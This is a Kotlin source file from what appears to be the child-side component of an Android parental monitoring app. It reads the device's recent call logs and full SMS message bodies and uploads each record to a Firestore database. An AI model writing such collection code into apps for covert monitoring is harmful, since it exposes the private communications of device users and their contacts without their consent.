package com.abuzahra.child.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.abuzahra.child.utils.FirestoreHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object DataSyncManager {

    suspend fun syncCallLogs(context: Context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            withContext(Dispatchers.IO) {
                try {
                    val cursor = context.contentResolver.query(
                        CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
                    )
                    cursor?.use {
                        val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                        val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                        val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                        val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

                        while (it.moveToNext()) {
                            val data = mapOf(
                                "phone" to it.getString(numberIndex),
                                "type" to it.getString(typeIndex), // Incoming, Outgoing, Missed
                                "timestamp" to it.getLong(dateIndex),
                                "duration" to it.getString(durationIndex)
                            )
                            FirestoreHelper.uploadLog("calls", data)
                        }
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
    }

    suspend fun syncSmsLogs(context: Context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            withContext(Dispatchers.IO) {
                try {
                    val cursor = context.contentResolver.query(
                        Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
                    )
                    cursor?.use {
                        val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                        val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                        val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)

                        while (it.moveToNext()) {
                            val data = mapOf(
                                "phone" to it.getString(addressIndex),
                                "body" to it.getString(bodyIndex),
                                "timestamp" to it.getLong(dateIndex)
                            )
                            FirestoreHelper.uploadLog("sms", data)
                        }
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
    }
}
